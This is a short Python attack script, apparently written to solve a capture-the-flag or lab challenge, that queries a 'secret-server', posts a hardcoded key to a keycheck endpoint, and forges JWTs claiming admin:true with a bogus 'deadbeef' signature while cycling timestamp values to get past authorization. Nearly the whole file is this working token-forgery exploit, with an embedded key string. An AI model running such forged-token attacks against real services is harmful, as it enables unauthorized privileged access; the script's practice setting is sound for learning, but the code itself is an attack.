#!/usr/bin/env python3
import base64, json, requests, time, subprocess

SECRET = "77.20.124.51"
MAGIC = "magic-key.hkn"
KEY = "C%{6bSUAs52sI@$K8Ouk0"

print("### Verify .51 as secret-server ###")
r = requests.get(f"http://{SECRET}/next_chars", params={"char": "a"}, timeout=5)
print(f"  /next_chars?char=a -> {r.status_code}: {r.text.strip()[:100]}")
r2 = requests.get(f"http://{SECRET}/", timeout=5)
print(f"  / -> {r2.status_code}: {r2.text.strip()[:150]}")

print("\n### Check current footer date on magic-key.hkn/keycheck ###")
r3 = requests.post(f"http://{MAGIC}/keycheck", headers={"Content-Type": "text/plain"},
                    data=f"key={KEY}", timeout=5)
for line in r3.text.splitlines():
    if "Copyright" in line or "message" in line.lower():
        print(f"  {line.strip()}")
print(f"  JWT header: {r3.headers.get('JWT')}")

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def make_jwt(admin, timestamp):
    h = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64url(json.dumps({"admin": admin, "timestamp": timestamp}, separators=(",", ":")).encode())
    return f"{h}.{p}.deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdea"

candidates_ts = [86400, 0, 1, 172800, 1300000000, 259200, 43200]

print(f"\n### Testing timestamp candidates against secret-server /next_chars?char=s with admin:true JWT ###")
for ts in candidates_ts:
    jwt = make_jwt(True, ts)
    r = requests.get(f"http://{SECRET}/next_chars", params={"char": "s"}, headers={"JWT": jwt}, timeout=5)
    print(f"  timestamp={ts} -> {r.status_code}: {r.text.strip()[:150]}")
